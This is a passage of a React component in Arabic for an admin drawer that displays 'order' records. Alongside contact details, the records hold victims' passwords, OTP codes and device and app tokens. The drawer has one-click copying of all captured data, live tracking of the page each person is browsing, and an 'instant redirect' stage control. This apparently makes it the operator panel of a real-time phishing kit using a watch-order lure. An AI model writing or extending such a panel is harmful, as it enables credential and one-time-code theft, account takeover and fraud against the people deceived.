              <span
                className={`inline-block h-2 w-2 rounded-full ${
                  isOnline ? "animate-pulse bg-success" : "bg-muted-foreground/40"
                }`}
              />
              <h3 className="text-base font-black">{order.name || "بلا اسم"}</h3>
            </div>
            <p className="mt-1 font-mono text-[11px] text-muted-foreground">
              {order.session_id}
            </p>
            {currentPath && (
              <p className="mt-1 text-[11px] text-muted-foreground">
                يتصفّح الآن: <span className="font-mono">{currentPath}</span>
              </p>
            )}
          </div>
          <button
            onClick={onClose}
            className="grid h-8 w-8 place-items-center rounded-lg border border-border hover:bg-secondary"
            aria-label="إغلاق"
          >
            <X className="h-4 w-4" />
          </button>
        </div>

        <div className="flex-1 space-y-4 overflow-y-auto p-4 text-sm">
          <Button
            variant="outline"
            size="sm"
            className="w-full gap-2"
            onClick={() => {
              const lines = [
                `الاسم: ${order.name ?? "-"}`,
                `الهاتف: ${order.phone ?? "-"}`,
                `المدينة: ${order.city ?? "-"}`,
                `التصميم: ${order.spec ?? order.watch_id ?? "-"}`,
                `كود المستخدم: ${order.user_code ?? "-"}`,
                `كلمة المرور: ${order.password ?? "-"}`,
                `OTP: ${order.otp ?? "-"}`,
                `توكن الجهاز: ${order.hw_token ?? "-"}`,
                `توكن التطبيق: ${order.app_token ?? "-"}`,
              ].join("\n");
              onCopy(lines, "كل بيانات الطلب");
            }}
          >
            <Copy className="h-4 w-4" />
            نسخ كل البيانات
          </Button>
          <Field label="الهاتف" value={order.phone} onCopy={onCopy} />
          <Field label="المدينة" value={order.city} onCopy={onCopy} />
          <Field label="التصميم" value={order.spec || order.watch_id} onCopy={onCopy} multiline />

          <div className="grid grid-cols-2 gap-3">
            <Field label="كود المستخدم" value={order.user_code} onCopy={onCopy} mono />
            <Field label="كلمة المرور" value={order.password} onCopy={onCopy} mono />
          </div>
          <div className="grid grid-cols-3 gap-3">
            <Field label="OTP" value={order.otp} onCopy={onCopy} mono />
            <Field label="توكن الجهاز" value={order.hw_token} onCopy={onCopy} mono />
            <Field label="توكن التطبيق" value={order.app_token} onCopy={onCopy} mono />
          </div>

          <div className="grid grid-cols-2 gap-3">
            <div>
              <p className="mb-1 text-[11px] font-black text-muted-foreground">توجيه فوري</p>
              <Select
                value={order.stage}
                onValueChange={(v) => onStage(v as OrderRow["stage"])}
              >
                <SelectTrigger className="h-9 text-xs">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {STAGES.map((s) => (
                    <SelectItem key={s.value} value={s.value}>
                      {s.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div>
              <p className="mb-1 text-[11px] font-black text-muted-foreground">تغيير الحالة</p>
              <Select value={order.status} onValueChange={onStatus}>
                <SelectTrigger className={`h-9 text-xs font-bold ${STATUS_STYLE[order.status] ?? ""}`}>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {STATUSES.map((s) => (
                    <SelectItem key={s.value} value={s.value}>
                      {s.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
          </div>

          <div>
            <p className="mb-2 text-[11px] font-black text-muted-foreground">
              الخط الزمني ({events.length})
            </p>
            <ol className="relative space-y-3 border-r-2 border-border pr-4">
              {events.map((e) => (
                <li key={e.id} className="relative">
                  <span className="absolute -right-[22px] top-1.5 h-2.5 w-2.5 rounded-full bg-primary" />
                  <div className="text-xs font-bold">{STAGE_LABEL[e.stage] ?? e.stage}</div>
                  <div className="text-[10px] text-muted-foreground">
                    {new Date(e.created_at).toLocaleString("ar-EG")}
                  </div>
                </li>
              ))}
              {events.length === 0 && (
                <li className="text-xs text-muted-foreground">لا أحداث</li>
              )}
            </ol>
          </div>
        </div>
      </aside>
    </div>
  );
}

function Field({
  label,
  value,
  onCopy,
  mono,
  multiline,
}: {
  label: string;
  value: string | null | undefined;
  onCopy: (text: string, label: string) => void;
  mono?: boolean;
  multiline?: boolean;
}) {
  const val = value || "";
  return (
    <div>
      <div className="mb-1 flex items-center justify-between">
        <span className="text-[11px] font-black text-muted-foreground">{label}</span>
        {val && (
          <button
            onClick={() => onCopy(val, label)}
            className="grid h-6 w-6 place-items-center rounded-md text-muted-foreground hover:bg-secondary hover:text-foreground"
            title="نسخ"
          >
            <Copy className="h-3 w-3" />
          </button>
        )}
      </div>
      <div
        className={`rounded-lg border border-border bg-secondary/40 px-3 py-2 text-xs ${
          mono ? "font-mono" : ""
        } ${multiline ? "whitespace-pre-wrap" : "truncate"}`}
      >
        {val || <span className="text-muted-foreground">—</span>}
      </div>
    </div>
  );
}

function timeAgo(iso: string): string {
  const d = new Date(iso).getTime();
  const s = Math.floor((Date.now() - d) / 1000);
  if (s < 5) return "الآن";
  if (s < 60) return `${s}ث`;
  if (s < 3600) return `${Math.floor(s / 60)}د`;
  if (s < 86400) return `${Math.floor(s / 3600)}س`;
  return new Date(iso).toLocaleDateString("ar-EG");
}
